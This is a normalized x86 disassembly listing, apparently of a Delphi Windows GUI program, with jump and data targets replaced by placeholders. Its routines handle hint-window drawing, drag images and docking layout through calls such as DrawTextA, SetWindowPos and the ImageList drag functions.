cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_420114
xor eax eax
push ebp
push sub_43cbb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_420440
xor eax eax
push ebp
push sub_43cb90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cb97
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_420440
retn
sub_43cbc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43d4b8
mov edx 0x80ffff
mov eax esi
call sub_4352ac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_4202e0
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41fddc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43cc30
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_438774
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bc9c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43870c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_43cc9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43ccf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ccf9
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ReleaseDC
retn
sub_43cd00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43cd99
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41f4f4
mov eax ebx
call sub_437420
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x14 ]
call sub_40435c
push eax
mov eax [ ebx + 0x208 ]
call sub_4203c0
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cda0
lea eax [ ebp - 0x14 ]
call sub_403e9c
retn
sub_43cda8
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_43ce14
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_43ce9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cea6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43510c
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_420220
mov edx eax
add edx 0x6
mov eax esi
call sub_4348c8
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43510c
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_42023c
mov edx eax
add edx 0x4
mov eax esi
call sub_4348ec
sub_43ceac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43d085
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43513c
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_436358
mov eax [ esi ]
call sub_452318
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_452324
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_452318
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45230c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_452324
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_452300
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45230c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_452300
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43901c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d08c
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40415c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_440100
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call [ rw-data ]
sub_43d094
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43d0bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_4156e4
mov eax esi
call sub_437420
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ esi + 0x208 ]
call sub_4203c0
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43d118
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4156e4
call sub_42b194
call sub_42b274
test al al
jne r-xdata
call sub_42b194
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42b500
push esp
push 0x1
push 0xf
push 0x0
call sub_42b194
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42b2e4
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_43d184
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_439924
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_43d1a8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43d1e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d2a8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4527ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4250e4
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4527ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4250e4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_43d2b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_441fa4
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43d314
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_441e68
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_43d1e8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43d374
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_43d2b4
push 0x0
call ShowCursor
sub_43d374
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_441e68
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_43d3d8
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d1a8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43d3d8
push ebx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_43d3fc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_43d1a8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43d470
push ebx
push esi
mov esi eax
mov eax esi
call sub_441e68
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_43d3d8
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_43d2fc
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43d4b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_437614
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_433ce8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43d514
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_437738
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_43d564
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_420114
xor eax eax
push ebp
push sub_43d602
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_420440
xor eax eax
push ebp
push sub_43d5df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_433d00
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d5e6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_420440
retn
sub_43d614
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d6a8
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_43d630
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43d6a8
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_43dca0
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_43d6a8
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_43d6dc
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43d76c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov edx 0x2
call sub_43d76c
jmp r-xdata
retn
sub_43d724
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43d7d8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov edx 0x2
call sub_43d7d8
jmp r-xdata
retn
sub_43d76c
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_43dba0
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_43d7d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_43d68c
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_43dba0
push eax
mov eax esi
call sub_43d6dc
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_43dba0
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_43d888
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43d68c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_43dca0
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_43d7d8
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_43d68c
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_43d7d8
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_43d6dc
mov edx eax
add edx esi
mov eax ebx
call sub_43dbc8
mov edx edi
mov eax ebx
call sub_43dbc8
jmp r-xdata
mov eax ebx
call sub_43da28
mov eax ebx
call sub_43dc78
mov ebx eax
test ebx ebx
jne r-xdata
sub_43d930
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403e9c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ef0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
sub_43d974
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403360
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_43d9e5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_435e00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_43d9f8
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_43dc78
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_43da28
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43d7d8
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d7d8
mov esi eax
push ebp
call sub_43d9f8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43dc78
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d76c
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43d76c
mov ecx ebx
pop edx
call sub_41570c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434acc
mov eax [ ebp - 0x4 ]
call sub_43dba0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_43dba0
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_43dba0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_43dba0
push ebx
mov ebx eax
mov eax ebx
call sub_43d6a8
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_43d630
test al al
je r-xdata
mov eax ebx
call sub_43d6dc
pop ebx
retn
sub_43dbdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dbc8
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43d678
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_43dbcc
mov edx esi
call sub_43dbdc
sub_43dc18
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43dba0
mov edi eax
mov eax ebx
call sub_43d6dc
cmp edi eax
jl r-xdata
mov eax esi
call sub_43d888
mov eax [ esi + 0x1c ]
push eax
push sub_43f728
mov edx esi
call sub_43df54
mov eax ebx
call sub_43dba0
mov edi eax
mov eax esi
call sub_43d724
cmp edi eax
jle r-xdata
mov eax ebx
call sub_43dc18
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_43dc84
push ebx
